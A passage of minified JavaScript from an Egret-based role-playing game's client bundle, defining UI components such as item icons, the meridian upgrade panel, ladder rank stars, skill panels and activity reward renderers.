0===e?void 0:e.length)||0,o=0;n>o;o++)if(null===(i=this.cfgData)||void 0===i?void 0:i.extAttQuality[o])return this.addChild(this.iconSoulEffect),void(this.iconSoulEffect.data=RES_DIR_EFF+("Legend"+(this.cfgData.extAttQuality[o]-1)));r.DisplayUtils.removeFromParent(this.iconSoulEffect)},e.prototype.showItemEffect=function(){var t;(null===(t=this.config)||void 0===t?void 0:t.effId)?(this.addChildAt(this.itemEffect,this.getChildIndex(this.imgIcon)-1),this.itemEffect.data=RES_DIR_EFF+this.config.effId):r.DisplayUtils.removeFromParent(this.itemEffect)},e.prototype.setItemEff2=function(t){this._imgEffstr=t,this.itemEffect&&(this.itemEffect?(this.addChildAt(this.itemEffect,this.getChildIndex(this.imgIcon)-1),this.itemEffect.data=RES_DIR_EFF+this._imgEffstr):r.DisplayUtils.removeFromParent(this.itemEffect))},e.prototype.updateImgJob=function(){if(this.skin){var t=o.ItemUtil.getJob(this.config);this.imgJob.visible=t>0&&t!=s.SubRoles.ins().getSubRoleByIndex(0).job}},e}(n.BaseItemRender);e.ItemIcon=f,window.ItemIcon=f,__reflect(f.prototype,"ItemIcon",[]),window.ItemIcon=f},function(t,e){},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.JimMaiItem=void 0;var n=i(21),o=i(16),s=function(t){function e(){var e=t.call(this)||this;return e._sn_="JinMaiItemSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.guang.visible=!1,"boolean"==typeof this._showItem&&this.setShowItem(this._showItem),!isNaN(this._type)&&this.setLights(this._type)
},e.prototype.setShowItem=function(t){this._showItem=t,this.item&&(this.item.visible=t,this.bgImg.visible=!t)},e.prototype.setLights=function(t){var e=this;if(this._type=t,this.skin){if(0==t&&this.mc)return this.mc.stop(),void(this.mc.visible=!1);if(null==this.mc&&(this.mc=new n.MovieClip,this.mc.x=this.mc.y=20,this.addChild(this.mc)),this.mc.visible=!0,this.mc.parent||this.addChild(this.mc),1==t)this.mc.playFile(RES_DIR_EFF+"pulse1",-1);else if(2==t)this.mc.playFile(RES_DIR_EFF+"pulse2",-1);else if(3==t){var i=egret.Tween.get(this);this.mc.playFile(RES_DIR_EFF+"pulse3",1,null,!1),i.wait(800).call(function(){e.mc.playFile(RES_DIR_EFF+"pulse2",-1)})}else 4==t&&this.mc.playFile(RES_DIR_EFF+"pulse3",1,function(){o.DisplayUtils.removeFromParent(e.mc),e.mc=null},!0)}},e}(eui.Component);e.JimMaiItem=s,window.JimMaiItem=s,__reflect(s.prototype,"JimMaiItem",[]),window.JimMaiItem=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.JingMaiPanel=void 0;var n=i(1),o=i(0),s=i(134),a=i(6),r=i(69),l=i(13),h=i(22),u=i(42),p=i(10),d=i(31),c=i(36),f=i(19),g=i(4),m=i(59),v=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="JinMaiSkin",e._curRole=0,e.isclick=!1,e}return __extends(e,t),Object.defineProperty(e.prototype,"curRole",{get:function(){return this._curRole},set:function(t){this._curRole=t,this.skin&&this.setForgeData(!1)},enumerable:!1,configurable:!0}),e.prototype.skinComplete=function(){this.curRole=this.curRole},e.prototype.addDisplay=function(){this.addTouchEvent(this.boostBtn,this.updateDown,!0),observe(this,this.setForgeData,s.JingMaiCT.ins().postUpdate,a.BagCT.ins().postItemAdd,a.BagCT.ins().postItemCountChange,a.BagCT.ins().postItemDel,g.ActorCC.postGoldChange),this.boostBtn.addEventListener(egret.TouchEvent.TOUCH_TAP,this.changeClick,this),this.setForgeData(!1)},e.prototype.removeDisplay=function(){this.boostBtn&&(this.removeTouchEvent(this.boostBtn,this.updateDown,!1),this.boostBtn.removeEventListener(egret.TouchEvent.TOUCH_TAP,this.changeClick,this))},e.prototype.changeClick=function(){this.isclick=!1},e.prototype.updateDown=function(){var t,e=this,i=o.GlobalConfig.JingMaiLevelConfig[null===(t=this._data)||void 0===t?void 0:t.level];if(!this.isclick&&i)if(this._data.level%10==0&&this._data.level/10>this._data.stage&&0!=this._data.level){this.isclick=!0;for(var n=o.GlobalConfig.JingMaiStageConfig[this._data.stage],a=!0,l=0;l<n.cost.length;l++)if(!f.GlobalFun.checkCost(n.cost[l].count,n.cost[l].id,"",!0,null,!0))return a=!1,void(2==n.cost[l].id||1==n.cost[l].id||m.GameFlashSaleCt.ins().reportJMMaterialNot());if(!a)return;this.showUpgradeEffect(),Timer.start(1e3,1,function(){s.JingMaiCT.ins().sendUpgrade(e.curRole),r.SoundUtil.play(r.SoundEnum.SKILL_UP)},this)}else{if(!f.GlobalFun.checkCost(i.count,i.itemId,"",!0,null,!0))return this.isclick=!0,void(2==i.itemId||1==i.itemId||m.GameFlashSaleCt.ins().reportJMMaterialNot());if(!f.GlobalFun.checkCost(i.gold,c.MoneyConst.gold))return;s.JingMaiCT.ins().sendBoost(this.curRole),r.SoundUtil.play(r.SoundEnum.SKILL_UP)}},e.prototype.showUpgradeEffect=function(){for(var t=0;9>=t;t++)this["jinmai_"+t].setLights(4)},e.prototype.setForgeData=function(t){void 0===t&&(t=!0),this.costGrp.visible=!1,this._data=l.SubRoles.ins().getSubRoleByIndex(this.curRole).jingMaiData;var e=o.GlobalConfig.JingMaiStageConfig[this._data.stage],i=o.GlobalConfig.JingMaiLevelConfig[this._data.level];this.eStage.stages=gettext("{0}\n阶\n.\n",u.StringUtils.NumberTurnChinese(e.level))+e.name.split("").join("\n"),this.eStage.sFont="num_12_fnt",this.attr.textFlow=(new egret.HtmlTextParser).parse(h.AttributeData.getAttrShowStr(h.AttributeData.AttrAddition(e.attr,i.attr),":")),this._totalPower=p.ItemUtil.getAttrPower(h.AttributeData.AttrAddition(e.attr,i.attr)),this.powLab.text=gettext("战力:{0}",this._totalPower);var n=this._data.level/10-e.stage;if(this.boostBtn.sRp=this._data.jingMaiCanUp(),this._data.level<o.GlobalConfig.JingMaiCommonConfig.levelMax){var s=void 0,a=void 0;this.img1.visible=!0,this._data.level>0&&this._data.level%10==0&&n?(s=o.GlobalConfig.JingMaiStageConfig[this._data.stage+1],a=i):(s=e,a=o.GlobalConfig.JingMaiLevelConfig[this._data.level+1]),0==this.nextAttr.visible&&(this.nextAttr.visible=!0,this.countLabel.x=2,this.countLabel.y=497),this.nextAttr.textFlow=(new egret.HtmlTextParser).parse(h.AttributeData.getAttrShowStr(h.AttributeData.AttrAddition(null===s||void 0===s?void 0:s.attr,null===a||void 0===a?void 0:a.attr),":")),this.boostBtn.visible=!0,this.next.visible=!0,this.boostBtn.label=this._data.level>0&&this._data.level%10==0&&n?gettext("升  阶"):gettext("冲  脉"),this.costGrp.visible=!0,this.countLabel.text="",this._data.level>0&&this._data.level%10==0&&n?(e.cost[0].id>2?this.costCm1.setData(e.cost[0]):(this.costCm1.setShow(d.ITEM_ICON[d.ITEM_TYPE[e.cost[0].id]],e.cost[0].count),this.costCm1.setCountLabelColor({type:0,id:e.cost[0].id,count:e.cost[0].count})),e.cost[1].id>2?this.costCm2.setData(e.cost[1]):(this.costCm2.setShow(d.ITEM_ICON[d.ITEM_TYPE[e.cost[1].id]],e.cost[1].count),this.costCm2.setCountLabelColor({type:0,id:e.cost[1].id,count:e.cost[1].count}))):(this.costCm1.setData({type:0,id:i.itemId,count:i.count}),this.costCm2.setShow(d.ITEM_ICON.gold,i.gold),this.costCm2.setCountLabelColor({type:0,id:c.MoneyConst.gold,count:i.gold}))}else this.nextAttr.visible=!1,this.boostBtn.visible=!1,this.next.visible=!1,this.img1.visible=!1,this.countLabel.x=this.nextAttr.x-60,this.countLabel.y=this.nextAttr.y,this.countLabel.text=gettext("经脉已满阶");for(var r=0;9>r;r++)this["nadis"+r].source="zs_jm_line"+(1==n||r+1<this._data.level%10?"1":"2");for(var f,g=!0,r=0;9>=r;r++){f=this["jinmai_"+r];var m=1==n||r+1<=this._data.level%10;f.setShowItem(m),m?f.setLights(2):(t&&g&&r-1>=0&&this["jinmai_"+(r-1)].setLights(3),f.setLights(g?1:0),g=!1)}},e.prototype.tabRp=function(){return s.JingMaiCT.ins().rp.v},Object.defineProperty(e.prototype,"winTitle",{get:function(){return"skill_jm"},enumerable:!1,configurable:!0}),e}(n.BaseView);e.JingMaiPanel=v,window.JingMaiPanel=v,__reflect(v.prototype,"JingMaiPanel",[]),window.JingMaiPanel=v},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.LadderStarListView=void 0;var n=i(21),o=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="LadderSratListSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.addDisplay=function(){this.setLvAndRank(this.info),this.updataStarInfo(this.info)},e.prototype.setLvAndRank=function(t){if(this.info=t,this.skin){if(void 0==this.info)return this.eTitle.source="ladder_ranktitle_1",this.dwImg.source="ladder_rank_1",void(this.level.source=null);this.dwImg.source="ladder_rank"+this.info.level,this.eTitle.source="ladder_ranktitle_"+this.info.level,this.info.level>=4||this.info.showDan<=0||this.info.showDan>5?this.level.source=null:this.level.source="laddergradnum_"+this.info.showDan}},e.prototype.updataStarInfo=function(t){if(this.info=t,this.skin){if(this.info){this.len=t.state;for(var e=1;e<=t.state;e++)this["star"+e]&&(this["star"+e].currentState=e>this.info.showStar?"black":"light")}else this.len=0;this.currentState=this.len+"",this.setLvAndRank(this.info)}},e.prototype.upStarStatu=function(t,e,i){var o=this;void 0===i&&(i=!1);var s=e,a=i?t:t-1,r=this;0>=a&&(a=1),void 0==this.mc&&(this.mc=new n.MovieClip);var l=this["star"+a];this.mc.x=l.x+22,this.mc.y=l.y+22,this.addChild(this.mc);var h=this.len;i?(--s,this.mc.playFile(RES_DIR_EFF+"MoreStare",1,function(){-1!=r.getChildIndex(r.mc)&&r.removeChild(r.mc),l.currentState="light",h==a&&(l.currentState="black"),s>0&&a<o.len&&o.upStarStatu(++a,s,i)})):(--s,--a,this.mc.playFile(RES_DIR_EFF+"StarMiss",1,function(){-1!=r.getChildIndex(r.mc)&&r.removeChild(r.mc),l.currentState="black",0==a&&(o.upSign=!1)}),s=0),i&&a==this.len&&(this.upSign=!0)},e.prototype.showLvUp=function(t){this.numLevel=t},e.prototype.showRankUp=function(t){this.numRank=t,this.rankMc=new n.MovieClip,this.rankMc.x=100,this.rankMc.y=99,this.rankMc.playFile(RES_DIR_EFF+"RankWar4",1,this.RankChangeCallback.bind(this)),this.addChild(this.rankMc)},e.prototype.showLvDown=function(t){this.numLevel=t,this.level.source="laddergradnum_"+this.numLevel},e.prototype.RankChangeCallback=function(){this.dwImg.source="ladder_rank"+this.numRank,this.eTitle.source="ladder_ranktitle_"+this.numRank;var t=egret.Tween.get(this.dwImg);this.dwImg.alpha=0,t.to({alpha:1},700)},e}(eui.Component);e.LadderStarListView=o,window.LadderStarListView=o,__reflect(o.prototype,"LadderStarListView",[]),window.LadderStarListView=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.LadderStarView=void 0;var n=function(t){function e(){return t.call(this)||this}return __extends(e,t),e}(eui.Component);e.LadderStarView=n,window.LadderStarView=n,__reflect(n.prototype,"LadderStarView",[]),window.LadderStarView=n},function(t,e){},function(t,e){},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.MovieEui=void 0;var n=i(1),o=i(21),s=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.addDisplay=function(){if(this.stage&&this.name){if(this.numChildren<1)this.addChild(o.MovieClip.createCenterGruop(this.name,-1));else{var t=this.getChildAt(0),e=t.getChildAt(0);e.playFile(this.name,-1)}isNaN(this.angle)||this.drawAngle(this.angle)}},e.prototype.removeDisplay=function(){this.removeChildren()},Object.defineProperty(e.prototype,"data",{set:function(t){this.name=t,t?this.reshow():this.removeDisplay()},enumerable:!1,configurable:!0}),e.prototype.reshow=function(){this.addDisplay()},e.prototype.drawAngle=function(t){if(this.angle=t,!(this.numChildren<1)){var e=this.getChildAt(0),i=e.getChildAt(0);i.drawAngle(t)}},__decorate([delayCall()],e.prototype,"reshow",null),e}(n.BaseView);e.MovieEui=s,window.MovieEui=s,__reflect(s.prototype,"MovieEui",[])},function(t,e){},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.PowerPanel=void 0;var n=i(1),o=i(21),s=function(t){function e(){var e=t.call(this)||this;return e.showBg=!0,e.power=0,e}return __extends(e,t),e.prototype.setPower=function(t){this.power=t,this.totalPower&&(this.totalPower.text=t+""),this.powerLab&&(this.powerLab.text=gettext("战力：")+this.power+"")},e.prototype.setBgVis=function(t){this.skin&&(this.bgImg&&(this.bgImg.visible=t),this.flameGroup.visible=t),this.showBg=t},e.prototype.setMcVisible=function(t){this.flameGroup&&(this.flameGroup.visible=t)},e.prototype.skinComplete=function(){this.setBgVis(this.showBg),this.flameMC?this.flameMC.play(-1):(this.flameMC=new o.MovieClip,this.flameMC.x=76,this.flameMC.y=44,this.flameMC.playFile(RES_DIR_EFF+"PowerFire",-1),this.flameGroup.addChild(this.flameMC)),this.totalPower&&(this.totalPower.text=this.power+""),this.powerLab&&(this.powerLab.text=gettext("战力：")+this.power+"")},e}(n.BaseView);e.PowerPanel=s,window.PowerPanel=s,__reflect(s.prototype,"PowerPanel",[]),window.PowerPanel=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.PriceIcon=void 0;var n=i(18),o=i(36),s=i(5),a=i(30),r=i(10),l=i(0),h=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="PriceIconSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.priceLabel.textColor=n.ColorUtil.NORMAL_COLOR},e.prototype.addDisplay=function(){this.update()},e.prototype.update=function(){this.skin&&(this.setType(this._type),this.setPrice(this._price,this._price2),this.setData(this._data),this.setItemId(this._itemId))},e.prototype.getPrice=function(){return this._price},e.prototype.setPrice=function(t,e){if(void 0===e&&(e=-1),this._price=t,this._price2=e,this.skin)if(this._price2>=0){var i="";i=this._price2>=this._price?n.ColorUtil.GREEN_COLOR:n.ColorUtil.RED_COLOR,this.priceLabel.textFlow=s.TextFlowMaker.generateTextFlow("<font color="+i+">"+this._price2+"</font><font color="+n.ColorUtil.WHITE_COLOR+">/"+this._price+"</font> ")}else this.priceLabel.text=""+this._price},e.prototype.setText=function(t){this.priceLabel&&(this.priceLabel.textFlow=(new egret.HtmlTextParser).parser(t))},e.prototype.setData=function(t){if(this._data=t,this.skin&&t){var e="";if(t){var i=t;if(0==i.type)switch(i.id){case o.MoneyConst.yuanbao:e="szyuanbao";break;default:e=a.RewardData.getCurrencyRes(i.id)}else if(1==i.type){var n=l.GlobalConfig.ItemConfig[i.id];e=r.ItemUtil.getItemSource(n)}this._type=i.id,this.setPrice(i.count)}else if(t){var s=t;e=r.ItemUtil.getItemSource(s.itemConfig.id),this._type=s.itemConfig.id,this.setPrice(s.count)}this.iconImg&&(this.iconImg.source=e)}},e.prototype.setItemId=function(t){if(t&&void 0!=t&&(this._itemId=t,this.skin)){var e=r.ItemUtil.getItemSource(this._itemId);this.iconImg&&(this.iconImg.source=e)}},e.prototype.getType=function(){return this._type},e.prototype.setType=function(t){if(this._type=t,this.skin&&!isNaN(this._type)){var e=a.RewardData.getCurrencyRes(this._type);this.iconImg&&(this.iconImg.source=e)}},e}(eui.Component);e.PriceIcon=h,window.PriceIcon=h,__reflect(h.prototype,"PriceIcon",[]),window.PriceIcon=h},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RoleItem=void 0;var n=i(21),o=i(11),s=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._curRole=-1,e._index=-1,e.showTip=!0,e.showBoostLv=!0,e.showEff=!0,e}return __extends(e,t),e.prototype.init=function(){t.prototype.init.call(this),this.mc=new n.MovieClip,this.mc.x=46,this.mc.y=43},e.prototype.dataChanged=function(){if(this.showEff&&this._lastData&&this._lastData!=this.data&&this._model==this._lastModel&&this.playEff(),t.prototype.dataChanged.call(this),this.showBoostLv){var e=this._model.getEquipByIndex(this._index)||null;this.boostLv.text=(null===e||void 0===e?void 0:e.strengthen)>0?"+"+e.strengthen:" "}else this.boostLv.text="";this._lastData=this.data,this._lastModel=this._model},e.prototype.isShowTips=function(t){this.showTip=t},e.prototype.openEquipsTips=function(){this.showTip&&win.open("EquipDetailedWin",1,this.data.handle,this.itemConfig.id,this.data,this._model,this._curRole,this._index)},e.prototype.showPower=function(){this.openEquipsTips()},e.prototype.setModel=function(t){this._model=t},e.prototype.getModel=function(){return this._model},e.prototype.setCurRole=function(t){this._curRole=t},e.prototype.getCurRole=function(){return this._curRole},e.prototype.setIndex=function(t){this._index=t},e.prototype.playEff=function(){this.mc.playFile(RES_DIR_EFF+"UpEff1",1),this.addChild(this.mc)},e}(o.ItemBase);e.RoleItem=s,window.RoleItem=s,__reflect(s.prototype,"RoleItem",[]),window.RoleItem=s},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RoleMasterItem=void 0;var n=i(21),o=i(11),s=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._curRole=-1,e._index=-1,e.showTip=!0,e.showEff=!0,e}return __extends(e,t),e.prototype.init=function(){t.prototype.init.call(this),this.mc=new n.MovieClip,this.mc.x=46,this.mc.y=43},e.prototype.dataChanged=function(){this.showEff&&this._lastData&&this._lastData!=this.data&&this._model==this._lastModel&&this.playEff(),t.prototype.dataChanged.call(this),this._lastData=this.data,this._lastModel=this._model},e.prototype.isShowTips=function(t){this.showTip=t},e.prototype.openEquipsTips=function(){this.showTip&&win.open("EquipDetailedWin",1,this.data.handle,this.itemConfig.id,this.data,this._model,this._curRole,this._index)},e.prototype.showPower=function(){this.openEquipsTips()},e.prototype.setModel=function(t){this._model=t},e.prototype.getModel=function(){return this._model},e.prototype.setCurRole=function(t){this._curRole=t},e.prototype.getCurRole=function(){return this._curRole},e.prototype.setIndex=function(t){this._index=t},e.prototype.playEff=function(){this.mc.playFile(RES_DIR_EFF+"UpEff1",1),this.addChild(this.mc)},e}(o.ItemBase);e.RoleMasterItem=s,window.RoleMasterItem=s,__reflect(s.prototype,"RoleMasterItem",[]),window.RoleMasterItem=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RpButton=void 0;var n=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.sRp=!1,e}return __extends(e,t),e}(eui.Button);e.RpButton=n,window.RpButton=n,__reflect(n.prototype,"RpButton",[]),window.RpButton=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.SkillAndTotemWin=void 0;var n=i(1),o=i(17),s=i(80),a=i(6),r=i(86),l=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="SkillAndTotemWin",e.openIdx=0,e}return __extends(e,t),e.prototype.addDisplay=function(t){this.baseTab=this.eTab,this.baseViewStack=this.eVs,this.initTab(),this.openIdx>-1&&(this.baseTab.selectedIndex=this.baseViewStack.selectedIndex=this.openIdx)},e.prototype.initTab=function(){observe(this,this.updateTabRed,s.TotemCT.ins().updateTotemItem),observe(this,this.updateTabRed,a.BagCT.ins().postItemAdd),observe(this,this.updateTabRed,a.BagCT.ins().postItemChange),observe(this,this.updateTabRed,r.SkillCT.ins().updateSkillVule),observe(this,this.updateTabRed,r.SkillCT.ins().postSkillUpgrade),observe(this,this.updateTabRed,o.RedPointBaseSys.ins().RpChange)},e.prototype.updateTabRed=function(){this.eTab.updateReds()},e.prototype.tabRp=function(){var t;return r.SkillCT.ins().rp.v||(null===(t=s.TotemCT.ins().totemAllRed)||void 0===t?void 0:t.v)},e.prototype.removeDisplay=function(){this.skin&&(this.openIdx=-1)},e.prototype.changeView=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.baseTab?(this.baseTab.selectedIndex=t[0]||0,this.baseViewStack&&(this.baseViewStack.selectedIndex=t[0]||0)):t&&(this.openIdx=t[0]||0)},e}(n.BaseView);e.SkillAndTotemWin=l,window.SkillAndTotemWin=l,__reflect(l.prototype,"SkillAndTotemWin",[]),window.SkillAndTotemWin=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.SkillPanel=void 0;var n=i(1),o=i(13),s=i(6),a=i(86),r=i(539),l=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.rpUpdateMessage=[a.SkillCT.ins().updateSkillVule,a.SkillCT.ins().postSkillUpgrade,s.BagCT.ins().postItemAdd,s.BagCT.ins().postItemChange],e}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.addDisplay=function(){this.skillList.itemRenderer=r.SkillItem,this.skillList.dataProvider=this.skillListArr=new eui.ArrayCollection([]);var t=o.SubRoles.lookAtTar;(null===t||void 0===t?void 0:t.infoModel)&&t.infoModel.handle&&a.SkillCT.ins().sendSkilInfo(t.infoModel.handle),observe(this,this.initList,a.SkillCT.ins().viewShowSkill),observe(this,this.initList,a.SkillCT.ins().updateSkilInfo),observe(this,this.doAutoSkill,a.SkillCT.ins().doAutoSkill),this.initList()},e.prototype.removeDisplay=function(){if(this.skin){if(this.removeObserve(),this.skillList&&this.skillList.numElements>0)for(var t=0;t<this.skillList.numElements;t++){var e=this.skillList.getElementAt(t);e&&e.ClearObj()}this.skillListArr&&this.skillListArr.replaceAll(null),this.skillList&&(this.skillList.dataProvider=null)}},e.prototype.initList=function(t){void 0===t&&(t=-1);var e=o.SubRoles.ins().getSubRoleByIndex(0);if(e&&e.skillsData){for(var i=[],n=0;n<e.skillsData.length;n++){var s=e.skillsData[n],a={};a.skillData=s,a.show=n==t,i.push(a)}this.skillListArr.replaceAll(i)}},e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];return!0},e.prototype.tabRp=function(){return a.SkillCT.ins().rp.v},e.prototype.doAutoSkill=function(){this.initList()},e}(n.BaseView);e.SkillPanel=l,window.SkillPanel=l,__reflect(l.prototype,"SkillPanel",[]),window.SkillPanel=l},function(t,e){},function(t,e){},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.CharNpc=void 0;var n=i(255),o=i(122),s=i(95),a=i(20),r=function(t){function e(){var e=t.call(this)||this;return e.touchEnabled=!0,e.touchChildren=!1,e}return __extends(e,t),e.prototype.playCount=function(){return this._state==o.EntityAction.RUN||this._state==o.EntityAction.STAND?-1:1},e.prototype.updateModel=function(){this.x=this.infoModel.x,this.y=this.infoModel.y;var t=this.infoModel.data;t&&(this.infoModel.configID=t.appearance,this.x=t.x*a.GameMap.CELL_SIZE+(a.GameMap.CELL_SIZE>>1),this.y=t.y*a.GameMap.CELL_SIZE+(a.GameMap.CELL_SIZE>>1));var e=this.infoModel.npcConfig;this.setConfig(this.infoModel.avatarString),this.dir=this.infoModel.dir,this.playAction(e.action||o.EntityAction.STAND),this.addMc(s.CharMcOrder.BODY,this.infoModel.avatarFileName),this.infoModel.weaponFileName&&this.addMc(s.CharMcOrder.WEAPON,this.infoModel.weaponFileName)},e}(n.CharEffect);e.CharNpc=r,window.CharNpc=r,__reflect(r.prototype,"CharNpc",[]),window.CharNpc=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.CharTransfer=void 0;var n=i(255),o=i(1452),s=i(21),a=function(t){function e(){var e=t.call(this)||this;return e.touchEnabled=!0,e.transferName=new o.TransferNameHead,e.transferName.anchorOffsetX=40,e.transferName.anchorOffsetY=21,e.titleCantainer.addChild(e.transferName),e.touchEnabled=!0,e.touchChildren=!1,e.titleCantainer.anchorOffsetY=80,e}return __extends(e,t),e.prototype.updateModel=function(){this.x=this.infoModel.x,this.y=this.infoModel.y,this.transferName.updateModel(this.infoModel)},e.prototype.addDisplay=function(){this.mc=this.mc||new s.MovieClip,this.mc.playFile(this.infoModel.avatarFileName,-1),this.addChild(this.mc)},e}(n.CharEffect);e.CharTransfer=a,window.CharTransfer=a,__reflect(a.prototype,"CharTransfer",[]),window.CharTransfer=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TransferNameHead=void 0;var n=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="TransferName",e}return __extends(e,t),e.prototype.updateModel=function(t){this.info=t,this.skin&&(this.info.index?(this.visible=!0,this.num.text=this.info.index+""):this.visible=!1)},e.prototype.addDisplay=function(){this.updateModel(this.info)},e}(eui.Component);e.TransferNameHead=n,window.TransferNameHead=n,__reflect(n.prototype,"TransferNameHead",[]),window.TransferNameHead=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.EntityBuff=void 0;var n=i(37),o=i(0),s=i(241),a=function(){function t(){this.multRate=1}return t.prototype.dispose=function(){this.source=null,this.hostsHandle=null,this.multRate=1},t.createBuff=function(e,i,n){var s=o.GlobalConfig.EffectsConfig[e],a=0,r=n?n.time||0:0;return t.createBaseBuff(e,i,a,s.duration+r)},t.createBaseBuff=function(t,e,i,a){var r=o.GlobalConfig.EffectsConfig[t],l=ObjectPool.pop("EntityBuff");if(l.effConfig=r,l.value=i,l.addTime=egret.getTimer(),l.endTime=l.addTime+(a?a:r.duration),l.count=(a?a:r.duration)/r.interval>>0,l.step=0,l.source=e,r.type==s.SkillEffType.HostAddAttributes){null==l.hostsHandle&&(l.hostsHandle=[]);var h=n.EntityManager.ins().getRootMasterHandle(e.infoModel.handle);l.hostsHandle.indexOf(h)<0&&l.hostsHandle.push(h)}return l},t.prototype.isExecute=function(){return egret.getTimer()-this.addTime>this.step*this.effConfig.interval},t.prototype.canRemove=function(){return this.effConfig.type!=s.SkillEffType.Summon&&egret.getTimer()>=this.endTime},t.prototype.isCanotHit=function(){return this.effConfig.type==s.SkillEffType.AdditionalState&&1==this.effConfig.args.i},t}();e.EntityBuff=a,window.EntityBuff=a,__reflect(a.prototype,"EntityBuff",[]),window.EntityBuff=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.Progress=void 0;var n=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.updateSkinDisplayList=function(){var t=this.animation.isPlaying?this.animationValue:this.value,e=this.maximum,i=this.thumb;if(i){var n=i.width,o=i.height,s=Math.round(t/e*n);(0>s||s===1/0)&&(s=0);var a=Math.round(t/e*o);(0>a||a===1/0)&&(a=0),i.scaleX=t/e}this.labelDisplay&&(this.labelDisplay.text=this.valueToLabel(t,e))},e}(eui.ProgressBar);e.Progress=n,window.Progress=n,__reflect(n.prototype,"Progress",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.CDYBZhuanPanShowItem=void 0;var n=i(3),o=i(11),s=i(9),a=i(29),r=function(t){function e(){var e=t.call(this)||this;return e._sn_="CDYBZhuanPanShowItemSkin",e.list.itemRenderer=o.ItemBase,e}return __extends(e,t),e.prototype.dataChanged=function(){if(this.data){var t=this.data;a.ActivityPanel.getActivityTypeFromId(t.id);this.list.dataProvider=new eui.ArrayCollection(t.reward);var e=s.Activity.ins(),i=e.getActivityDataById(t.id);switch(this.scheduleTxt.text=i.hiScore>t.score?t.score+"/"+t.score:i.hiScore+"/"+t.score,this.redPoint0.visible=!1,i.getRewardState(t.index)){case 1:this.get0.label=gettext("领取"),this.get0.enabled=!0,this.redPoint0.visible=!0;break;case 2:this.get0.label=gettext("已领取"),this.get0.enabled=!1;break;default:this.get0.label=gettext("领取"),this.get0.enabled=!1}}},e}(n.BaseItemRender);e.CDYBZhuanPanShowItem=r,window.CDYBZhuanPanShowItem=r,__reflect(r.prototype,"CDYBZhuanPanShowItem",[]),window.CDYBZhuanPanShowItem=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.HappySevenDayBtnItemRender=void 0;var n=i(3),o=function(t){function e(){var e=t.call(this)||this;return e.day=0,e._sn_="dayBtnSkin",e.touchChildren=!1,e}return __extends(e,t),e.prototype.dataChanged=function(){this.dayImg.source=this.data.res,this.isOpen=this.data.isOpen,this.day=this.data.day,this.currentState=this.isOpen?"unlock":"lock",this.redpoint.visible=this.data.showRed},e.prototype.selectChange=function(){this.currentState=this.isOpen?this.selected?"unlockS":"unlock":"lock",this.data&&(this.redpoint.visible=this.data.showRed)},e}(n.BaseItemRender);e.HappySevenDayBtnItemRender=o,window.HappySevenDayBtnItemRender=o,__reflect(o.prototype,"HappySevenDayBtnItemRender",[]),window.HappySevenDayBtnItemRender=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.SDShowItemRender=void 0;var n=i(5),o=i(3),s=i(11),a=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.skinComplete=function(){this.list.itemRenderer=s.ItemBase},e.prototype.dataChanged=function(){this.scheduleTxt.textFlow=n.TextFlowMaker.generateTextFlow1(this.data.showText),this.list.dataProvider=new eui.ArrayCollection(this.data.reward)},e}(o.BaseItemRender);e.SDShowItemRender=a,window.SDShowItemRender=a,__reflect(a.prototype,"SDShowItemRender",[]),window.SDShowItemRender=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ActivityType10Data=void 0;var n=i(8),o=i(0),s=i(33),a=i(7),r=function(t){function e(e){var i=t.call(this,e)||this;return i.update(e),i}return __extends(e,t),e.prototype.update=function(t){this.record=t.readInt(),this.yb=t.readInt(),this.index=t.readInt(),this.state=t.readByte();var e=t.readByte();this.noticeArr=[];for(var 